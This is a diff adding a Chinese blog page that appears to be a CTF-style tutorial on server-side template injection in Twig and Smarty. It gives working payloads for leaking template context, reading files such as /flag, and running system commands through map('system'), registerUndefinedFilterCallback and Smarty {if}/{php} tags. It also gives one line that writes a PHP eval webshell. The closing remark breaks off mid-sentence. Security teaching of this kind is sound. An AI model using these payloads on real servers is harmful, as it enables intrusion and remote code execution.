@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html class="dark" lang="zh-CH" prefix="og: http://ogp.me/ns# 
+fb: http://ogp.me/ns/fb#
+article: http://ogp.me/ns/article#">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="keywords" content="技术,生活">
+
+<title>twig与smarty模板的ssti || L1uxsn&#39;Blog</title>
+<link rel="icon" href="https://L1uxsn.github.ioimages/default-cover.webp" type="image/x-icon">
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<meta property="og:title" content="twig与smarty模板的ssti">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://l1uxsn.github.io/2026/07/14/twig%E4%B8%8Esmarty%E6%A8%A1%E6%9D%BF%E7%9A%84ssti/index.html">
+<meta property="og:image" content="">
+<meta property="og:site_name" content="L1uxsn&#39;Blog">
+<meta property="og:author" content="L1uxsn">
+
+  
+  
+  
+  <meta name="description" content="twig与smarty模板的ssti模板介绍:Twig和Smarty都是PHP语言的模板引擎简单说，它们的作用是：把HTML代码和PHP逻辑分开，让代码更整洁、更安全123456789没有模板引擎时的混乱写法：?phpif($user):?&amp;gt;h1&amp;gt;?phpecho$user[&amp;#x27;name&amp;">
+
+
+<script src="/js/wang.js"></script>
+
+<link rel="stylesheet" href="/css/wang.css">
+<script> console.log("Hello"); </script>
+<meta name="generator" content="Hexo 8.1.1"></head>
+<body>
+<main>
+    <div id="agplAlert" style="z-index: 9999;">
+    <strong>请遵守AGPL 3.0协议</strong> 本主题已开源于<a target="_blank" rel="noopener" href="https://github.com/xingwangzhe/hexo-theme-wang">hexo-theme-wang</a>
+</div>
+    <header>
+    <nav>
+        <ul>
+            
+                <li>
+                    <a href="/" rel="noopener">
+                        
+                            <img src="/images/menu_ico/home.svg" class="menu-icon" alt="Home">
+                        
+                        Home
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/archives" rel="noopener">
+                        
+                            <img src="/images/menu_ico/archives.svg" class="menu-icon" alt="Archives">
+                        
+                        Archives
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/tags" rel="noopener">
+                        
+                            <img src="/images/menu_ico/tags.svg" class="menu-icon" alt="Tags">
+                        
+                        Tags
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/links" rel="noopener">
+                        
+                            <img src="/images/menu_ico/links.svg" class="menu-icon" alt="Links">
+                        
+                        Links
+                    </a>
+                </li>
+            
+            
+                <li>
+                    <button class="search-toggle-btn" aria-label="Open search">
+                        <img src="/images/menu_ico/search.svg" class="menu-icon" alt="search">
+                        Search
+                    </button>
+                </li>
+            
+        </ul>
+    </nav>
+</header>
+
+<script src="/js/header.js"></script>
+
+    
+<script src="/js/search.js"></script>
+
+
+    
+        <!-- 搜索模态框 -->
+        <div id="search-modal" class="search-modal">
+          <div class="search-modal-content">
+            <div class="search-header">
+              <form class="search-form" action="#" onsubmit="return false;">
+                <input type="text" id="search-input" placeholder="Search for articles" autocomplete="off">
+                <button type="button" class="search-close-btn" aria-label="Close">
+                  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <line x1="18" y1="6" x2="6" y2="18"></line>
+                    <line x1="6" y1="6" x2="18" y2="18"></line>
+                  </svg>
+                </button>
+              </form>
+            </div>
+            <div id="search-results"></div>
+          </div>
+        </div>
+
+        <script>
+        // 向全局对象添加i18n数据，以便search.js使用
+        window.WANG_THEME = window.WANG_THEME || {};
+        window.WANG_THEME.i18n = {
+          search: {
+            noResults: 'No results found',
+            loading: 'Loading...',
+            placeholder: 'Search for articles',
+            close: 'Close',
+            shortcut_tip: 'Press ESC to close',
+            toggle_search: 'Open search',
+            error_loading: 'Failed to load search data'
+          }
+        };
+        </script>
+    
+    <aside class="sidebar-container sidebar-left">
+    <div class="sidebar-bg">
+        <h2 class="site-title">L1uxsn'Blog</h2>
+        <img class="avatar avatar-round" src="/images/avatar.jpg" style="width:50px;" alt="网站头像">
+        <h2 class="site-author">L1uxsn</h2>
+        <h3 class="site-subtitle">分享技术和生活</h3>
+    </div>
+    <div class="sidebar-bg">
+        <ul class="social_links">
+            
+                <li>
+                    <a href="https://L1uxsn.github.io" aria-label="Github的链接">
+                        
+                            <div style="display: flex; margin-left: auto; margin-left: auto; justify-content: center;">
+                                <img src="/images/social_links/github.svg" class="icon" alt="Github的图标"><p>Github</p>
+                            </div>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="mailto:3586323056@qq.com" aria-label="Email的链接">
+                        
+                            <div style="display: flex; margin-left: auto; margin-left: auto; justify-content: center;">
+                                <img src="/images/social_links/envelope.svg" class="icon" alt="Email的图标"><p>Email</p>
+                            </div>
+                        
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
+</aside>
+<div class="post-container">
+  <article class="post">
+    <h1 class="post-title">twig与smarty模板的ssti</h1>
+
+    <div class="post-meta">
+      <span class="post-date">Posted on <time datetime="2026-07-14T13:59:56.000Z">2026-07-14</time></span>
+      
+        <span class="post-categories">
+          Category：<a class="category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+        </span>
+      
+      
+        <span class="post-updated">
+          Last Updated <time datetime="2026-07-17T17:37:20.619Z">2026-07-18</time>
+        </span>
+      
+      <span style="margin-left:10px;">👁<span id="busuanzi_value_page_pv"></span></span>
+    </div>
+    <div class="post-content">
+      <h1 id="twig与smarty模板的ssti"><a href="#twig与smarty模板的ssti" class="headerlink" title="twig与smarty模板的ssti"></a>twig与smarty模板的ssti</h1><h2 id="模板介绍"><a href="#模板介绍" class="headerlink" title="模板介绍:"></a>模板介绍:</h2><p><strong>Twig</strong> 和 <strong>Smarty</strong> 都是 <strong>PHP 语言的模板引擎</strong></p>
+<p>简单说，它们的作用是：<strong>把 HTML 代码和 PHP 逻辑分开</strong>，让代码更整洁、更安全</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">没有模板引擎时的混乱写法：</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(<span class="variable">$user</span>): <span class="meta">?&gt;</span></span><br><span class="line">    &lt;h1&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$user</span>[<span class="string">&#x27;name&#x27;</span>]; <span class="meta">?&gt;</span>&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">使用模板引擎后（HTML 纯模板）：</span><br><span class="line">&#123;% <span class="keyword">if</span> user %&#125;</span><br><span class="line">    &lt;h1&gt;&#123;&#123; user.name &#125;&#125;&lt;/h1&gt;</span><br><span class="line">&#123;% <span class="keyword">endif</span> %&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="核心语法"><a href="#核心语法" class="headerlink" title="核心语法:"></a>核心语法:</h2><p><strong>Twig:</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.&#123;<span class="comment"># Twig 语法 #&#125;    注释语法</span></span><br><span class="line">------------------</span><br><span class="line"><span class="number">2</span>.&#123;&#123; variable &#125;&#125;        把 PHP 传递过来的变量计算并输出到 HTML 页面上,关键点：&#123;&#123; ... &#125;&#125; 里的内容会被执行，结果会替换掉这组双花括号</span><br><span class="line">------------------</span><br><span class="line"><span class="number">3</span>.&#123;% <span class="keyword">if</span> condition %&#125;    &#123;<span class="comment"># 控制结构 #&#125;</span></span><br><span class="line">作用：实现 <span class="keyword">if</span>/<span class="keyword">else</span>、<span class="keyword">for</span> 循环等逻辑控制。这部分负责决定“显示什么”或“重复显示什么”，但它本身不输出内容。</span><br><span class="line">关键点：使用 &#123;% ... %&#125; 定界符，通常需要配合 &#123;% <span class="keyword">endif</span> %&#125; 或 &#123;% <span class="keyword">endfor</span> %&#125; 来结束。</span><br><span class="line"></span><br><span class="line">场景举例：根据用户的 loginStatus（登录状态）显示不同的欢迎语</span><br><span class="line">twig:</span><br><span class="line">&#123;% <span class="keyword">if</span> loginStatus == <span class="string">&#x27;logged_in&#x27;</span> %&#125;</span><br><span class="line">    &lt;p&gt;欢迎回来，&#123;&#123; username &#125;&#125;！&lt;/p&gt;</span><br><span class="line">&#123;% <span class="keyword">else</span> %&#125;</span><br><span class="line">    &lt;p&gt;您好，游客。请先&lt;a href=<span class="string">&quot;/login&quot;</span>&gt;登录&lt;/a&gt;。&lt;/p&gt;</span><br><span class="line">&#123;% <span class="keyword">endif</span> %&#125;</span><br><span class="line">---------------------</span><br><span class="line"><span class="number">4</span>.&#123;&#123; name|upper &#125;&#125;      &#123;<span class="comment"># 过滤器 #&#125;</span></span><br><span class="line">作用：在变量输出到页面之前，通过一个“过滤器”修改它的显示结果。</span><br><span class="line">关键点：使用竖线 | 连接变量和过滤器。也可以串联多个过滤器，如 &#123;&#123; name|lower|capitalize &#125;&#125;。</span><br><span class="line">场景举例：确保所有用户名在页面上都以全大写形式显示，用于强调</span><br><span class="line"></span><br><span class="line">twig:</span><br><span class="line">&lt;p&gt;重要通知：您的账户名 &#123;&#123; name|upper &#125;&#125; 已注册成功。&lt;/p&gt;</span><br><span class="line">------------------------------------------------------------------------------------------------------------</span><br><span class="line">Twig 使用不同的定界符来区分 HTML 和模板逻辑，你可以把它们理解为“特殊的标记”，告诉 Twig 引擎哪部分是普通 HTML，哪部分是需要执行的动态代码</span><br></pre></td></tr></table></figure>
+
+<p><strong>smarty:</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.&#123;<span class="variable">$variable</span>&#125;           &#123;<span class="comment"># 输出变量（单花括号） #&#125;</span></span><br><span class="line">输出变量：&#123;<span class="variable">$variable</span>&#125;</span><br><span class="line">作用：把 PHP 传递过来的变量直接输出到 HTML 页面上</span><br><span class="line">关键点：Smarty 用单花括号加美元符 &#123;$ ... &#125;，Twig 用双花括号 &#123;&#123; ... &#125;&#125;。</span><br><span class="line">场景举例：后端 PHP 代码传入一个叫 username 的变量，值为 <span class="string">&quot;张三&quot;</span>。</span><br><span class="line">  </span><br><span class="line">smarty:</span><br><span class="line">&lt;h1&gt;欢迎您，&#123;<span class="variable">$username</span>&#125;！&lt;/h1&gt;</span><br><span class="line">------------------------------------</span><br><span class="line"><span class="number">2</span>.&#123;<span class="keyword">if</span> <span class="variable">$condition</span>&#125;       &#123;<span class="comment"># 控制结构 #&#125;</span></span><br><span class="line">作用：在模板里写 <span class="keyword">if</span>/<span class="keyword">else</span> 判断或 <span class="keyword">foreach</span> 循环，控制 HTML 的显示逻辑。</span><br><span class="line">关键点：Smarty 用 &#123;<span class="keyword">if</span> ...&#125; 和 &#123;/<span class="keyword">if</span>&#125; 作为开始和结束标记。Twig 则用 &#123;% <span class="keyword">if</span> ... %&#125; 和 &#123;% <span class="keyword">endif</span> %&#125;。</span><br><span class="line">场景举例：根据用户的 is_logged_in 状态，显示不同的内容。</span><br><span class="line"></span><br><span class="line">smarty:</span><br><span class="line">&#123;<span class="keyword">if</span> <span class="variable">$is_logged_in</span>&#125;</span><br><span class="line">    &lt;p&gt;欢迎回来，&#123;<span class="variable">$username</span>&#125;！&lt;/p&gt;</span><br><span class="line">&#123;<span class="keyword">else</span>&#125;</span><br><span class="line">    &lt;p&gt;您好，游客。请先 &lt;a href=<span class="string">&quot;/login&quot;</span>&gt;登录&lt;/a&gt;。&lt;/p&gt;</span><br><span class="line">&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">---------------------------------</span><br><span class="line"><span class="number">3</span>.&#123;<span class="variable">$name</span>|upper&#125;         &#123;<span class="comment"># 变量修饰器 #&#125;</span></span><br><span class="line">作用：在变量输出前，通过“修饰器”修改它的显示效果，功能和 Twig 的“过滤器”一模一样。</span><br><span class="line">关键点：同样使用竖线 | 连接变量和修饰器。Smarty 叫“修饰器”，Twig 叫“过滤器”。</span><br><span class="line">场景举例：确保用户名在页面上以全大写形式显示</span><br><span class="line"></span><br><span class="line">smarty:</span><br><span class="line">&lt;p&gt;系统提示：您的账户名 &#123;<span class="variable">$name</span>|upper&#125; 已创建。&lt;/p&gt;    </span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h2><p><strong>Twig 与 Jinja2 利用方式的本质区别</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">对比维度</th>
+<th align="left">Jinja2 (Python)</th>
+<th align="left">Twig (PHP)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>利用核心</strong></td>
+<td align="left"><code>__class__.__mro__[2].__subclasses__()</code> 链</td>
+<td align="left"><code>_self.env</code> 环境变量 + 回调函数注册</td>
+</tr>
+<tr>
+<td align="left"><strong>为何不同</strong></td>
+<td align="left">Python 中一切皆对象，可通过类继承链找到 <code>os</code> 模块</td>
+<td align="left">Twig 无法调用静态方法，也没有 <code>__class__</code> 链</td>
+</tr>
+<tr>
+<td align="left"><strong>命令执行方式</strong></td>
+<td align="left">找到 <code>os.system</code> 或 <code>subprocess.Popen</code></td>
+<td align="left">注册 <code>exec</code> 或 <code>system</code> 为过滤器后调用</td>
+</tr>
+</tbody></table>
+<p><strong>核心结论</strong>：Twig 的利用突破口是 <strong><code>_self.env</code></strong> 这个环境变量，它暴露了 Twig 内部的方法。</p>
+<h3 id="基础探测：-确认模板"><a href="#基础探测：-确认模板" class="headerlink" title="基础探测：(确认模板)"></a>基础探测：(确认模板)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*7&#125;&#125;                    # 返回 49 → SSTI 存在</span><br><span class="line">&#123;&#123;&quot;7&quot;*7&#125;&#125;                  # 返回 49（PHP 特性，不是字符串重复）</span><br><span class="line">&#123;&#123;[1,2,3][0]&#125;&#125;             # 返回 1 → 数组访问正常</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><p><strong>Twig 3.x</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.&#123;&#123;_context&#125;&#125;               # 输出当前模板上下文中所有可用的变量（包括 PHP 后端传递过来的数据）</span><br><span class="line">示例:</span><br><span class="line">如果后端传递了敏感数据（如数据库密码、API 密钥、flag），可以直接暴露：</span><br><span class="line">&#123;&#123; _context.db_password &#125;&#125;</span><br><span class="line">&#123;&#123; _context.flag &#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_context|keys&#125;&#125; - 查看变量名列表</span><br><span class="line">可能返回情况:[&#x27;app&#x27;, &#x27;request&#x27;, &#x27;user&#x27;, &#x27;session&#x27;, &#x27;flag&#x27;, ...]</span><br><span class="line">---------------------------</span><br><span class="line">3.&#123;&#123;_self&#125;&#125;                  # 查看模板对象信息</span><br><span class="line">&#123;&#123;_self&#125;&#125; 在 Twig 模板中代表当前模板对象本身</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>Twig 2.x</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.globals&#125;&#125;                    # 获取全局变量</span><br><span class="line">_self	当前模板对象</span><br><span class="line">_self.env	Twig 核心环境对象</span><br><span class="line">_self.env.globals	环境对象中存储的全局变量数组</span><br><span class="line">---------------------------------------------------</span><br><span class="line">&#123;&#123;_self.env.getTemplate(&quot;index.php&quot;)&#125;&#125;   # 读取文件</span><br><span class="line">getTemplate() 是 Twig 环境对象的一个方法，本意是加载一个模板文件。但如果传入一个普通文件（如 index.php），Twig 会尝试读取并返回该文件的内容</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p><strong>Twig 3.x</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"># 方法一：map + system（最稳定）</span><br><span class="line">&#123;&#123;[&#x27;whoami&#x27;]|map(&#x27;system&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line"># 方法二：map + passthru</span><br><span class="line">&#123;&#123;[&#x27;whoami&#x27;]|map(&#x27;passthru&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line"># 方法三：filter + system</span><br><span class="line">&#123;&#123;[&#x27;whoami&#x27;]|filter(&#x27;system&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line"># 方法四：map + exec</span><br><span class="line">&#123;&#123;[&#x27;whoami&#x27;]|map(&#x27;exec&#x27;)&#125;&#125;</span><br><span class="line">--------------------------------------------------</span><br><span class="line">map：它的作用是 “映射”。它会遍历数组中的每一个元素，对每个元素都执行一次你指定的函数，然后返回一个包含所有处理结果的新数组</span><br><span class="line"></span><br><span class="line">filter：它的作用是 “过滤”。它会遍历数组中的每一个元素，用你指定的函数来测试每个元素，只保留那些测试结果为真的元素</span><br><span class="line"></span><br><span class="line">示例解释:</span><br><span class="line">[&#x27;whoami&#x27;]：这是一个只包含一个字符串元素 &#x27;whoami&#x27; 的数组。</span><br><span class="line">|map(&#x27;system&#x27;)：map 过滤器会遍历这个数组，对数组里的每一个元素（也就是 &#x27;whoami&#x27; 这个字符串），去调用 PHP 的 system() 函数</span><br><span class="line"></span><br><span class="line">执行流程：</span><br><span class="line">map 拿到数组的第一个（也是唯一一个）元素：&#x27;whoami&#x27;。</span><br><span class="line"></span><br><span class="line">map 执行 system(&#x27;whoami&#x27;)。</span><br><span class="line"></span><br><span class="line">服务器执行命令，返回用户名。</span><br><span class="line"></span><br><span class="line">map 把执行结果放进一个新数组里。</span><br><span class="line"></span><br><span class="line">最终效果：system(&#x27;whoami&#x27;) 被执行，命令成功运行。因为 system 函数会直接输出结果，所以你就能在页面上看到命令的执行结果</span><br><span class="line">-------------------------------------------------</span><br><span class="line">&#123;&#123;[&#x27;whoami&#x27;]|filter(&#x27;system&#x27;)&#125;&#125;</span><br><span class="line">这是最容易混淆的一个。filter 的本意是 “过滤”，而不是执行</span><br><span class="line"></span><br><span class="line">[&#x27;whoami&#x27;]：同样是包含 &#x27;whoami&#x27; 字符串的数组。</span><br><span class="line"></span><br><span class="line">|filter(&#x27;system&#x27;)：filter 过滤器会遍历数组，用 system() 函数来测试每个元素。</span><br><span class="line"></span><br><span class="line">执行流程（关键区别在这里）：</span><br><span class="line">filter 拿到元素 &#x27;whoami&#x27;。</span><br><span class="line"></span><br><span class="line">filter 执行 system(&#x27;whoami&#x27;) 来测试。它会把这个字符串 &#x27;whoami&#x27; 作为参数传给 system 函数。</span><br><span class="line"></span><br><span class="line">命令确实会执行，这是我们要的结果。</span><br><span class="line"></span><br><span class="line">然后，filter 会检查 system(&#x27;whoami&#x27;) 的返回值。在 PHP 中，命令执行成功通常返回最后一行输出，或者非 false 值。</span><br><span class="line"></span><br><span class="line">因为返回值不是 false，所以 filter 认为 &#x27;whoami&#x27; 这个元素通过了测试，于是把它保留在新数组中。</span><br><span class="line"></span><br><span class="line">最终，filter 返回的新数组里，依然包含 &#x27;whoami&#x27; 这个字符串，而不是命令的执行结果。</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>Twig 2.x(经典利用)</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># 第 1 步：获取环境对象（验证）</span><br><span class="line">&#123;&#123;_self.env&#125;&#125;</span><br><span class="line"></span><br><span class="line"># 第 2 步：注册危险函数为&quot;未定义过滤器&quot;的回调</span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;system&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">-----------------------------------------</span><br><span class="line">Twig 允许开发者自定义过滤器。当你在模板中使用一个过滤器时，Twig 会去查找这个过滤器是否已定义：</span><br><span class="line"></span><br><span class="line">twig：</span><br><span class="line">&#123;&#123; &quot;hello&quot;|upper &#125;&#125;   &#123;# upper 是已定义的过滤器，正常工作 #&#125;</span><br><span class="line">如果你使用了一个不存在的过滤器：</span><br><span class="line"></span><br><span class="line">twig</span><br><span class="line">&#123;&#123; &quot;hello&quot;|hack &#125;&#125;     &#123;# hack 过滤器不存在，Twig 会报错 #&#125;</span><br><span class="line"></span><br><span class="line">registerUndefinedFilterCallback 的作用就是：让你可以指定一个“备用方案” —— 当遇到不存在的过滤器时，不要报错，而是去调用你指定的这个函数</span><br><span class="line">-------------------------------------------------------</span><br><span class="line"># 第 3 步：触发回调，执行命令</span><br><span class="line">&#123;&#123;_self.env.getFilter(&quot;whoami&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">1.尝试获取名为 whoami 的过滤器</span><br><span class="line"></span><br><span class="line">2.Twig 发现 whoami 过滤器不存在</span><br><span class="line"></span><br><span class="line">3.触发之前注册的回调：调用 system(&quot;whoami&quot;)</span><br><span class="line"></span><br><span class="line">4.系统执行命令，返回当前用户名</span><br><span class="line"></span><br><span class="line">5.返回值：命令执行的结果</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;system&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.getFilter(&quot;echo &#x27;&lt;?php eval($_GET[cmd]);?&gt;&#x27; &gt; shell.php&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="smarty"><a href="#smarty" class="headerlink" title="smarty"></a>smarty</h2><p>Smarty 是 PHP 生态中最经典的模板引擎之一，在 CTF 中频繁出现。与 Twig 不同，Smarty 的利用方式<strong>更加直接</strong>——它的 <code>{if}</code> 标签允许直接调用任意 PHP 函数</p>
+<h3 id="版本探测"><a href="#版本探测" class="headerlink" title="版本探测"></a>版本探测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$smarty.version&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="命令执行-1"><a href="#命令执行-1" class="headerlink" title="命令执行"></a>命令执行</h3><p> 方法一：<code>{if}</code> 标签直接执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 执行 phpinfo()</span><br><span class="line">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br><span class="line"></span><br><span class="line"># 执行系统命令（system）</span><br><span class="line">&#123;if system(&#x27;whoami&#x27;)&#125;&#123;/if&#125;</span><br><span class="line"></span><br><span class="line"># 执行系统命令（passthru）</span><br><span class="line">&#123;if passthru(&#x27;whoami&#x27;)&#125;&#123;/if&#125;</span><br><span class="line"></span><br><span class="line"># 读取文件</span><br><span class="line">&#123;if readfile(&#x27;/flag&#x27;)&#125;&#123;/if&#125;</span><br><span class="line"></span><br><span class="line"># 读取文件（另一种方式）</span><br><span class="line">&#123;if file_get_contents(&#x27;/flag&#x27;)&#125;&#123;/if&#125;</span><br><span class="line"></span><br><span class="line"># 显示源码</span><br><span class="line">&#123;if show_source(&#x27;/flag&#x27;)&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>方法二：<code>{php}</code> 标签（仅旧版本可用）</p>
+<p>在 Smarty 3.0 及更早版本中，<code>{php}</code> 标签允许直接嵌入 PHP 代码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;php&#125;</span><br><span class="line">system(&#x27;whoami&#x27;);</span><br><span class="line">&#123;/php&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>方法三：<code>{literal}</code> 标签 + PHP 标签（PHP 5 环境）</p>
+<p>在 PHP 5 环境中，可以通过 <code>{literal}</code> 标签包裹 PHP 的 <code>&lt;script&gt;</code> 标签来执行代码：</p>
+<p>smarty</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;literal&#125;</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;phpinfo();&lt;/script&gt;</span><br><span class="line">&#123;/literal&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>注意</strong>：这个方法在 PHP 7 中已失效（PHP 7 移除了 &#96;<script language="php">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  </p>
+
+    </div>
+  </article>
+  <div class="ccbyncsa">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-12">
+                <div class="copyright">
+                    <div class="author">
+                        <p>Author</p>
+                        <p>L1uxsn</p>
+                    </div>
+                    <div class="title">
+                        <p>Title</p>
+                        <p>twig与smarty模板的ssti</p>
+                    </div>
+                        <div class="publish">
+                            <p>Published</p>
+                            <p>2026-07-14</p>
+                        </div>
+                    <div class="ccbyncsa-icon">
+                        <p>CC-BY-NC-SA 4.0</p>
+                        <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                        <p class="ccbyncsa-icon-imgs" style="display: flex;">
+                        <img src="/images/cc.svg" alt="cc">
+                        <img src="/images/by.svg" alt="by">
+                        <img src="/images/nc.svg" alt="nc">
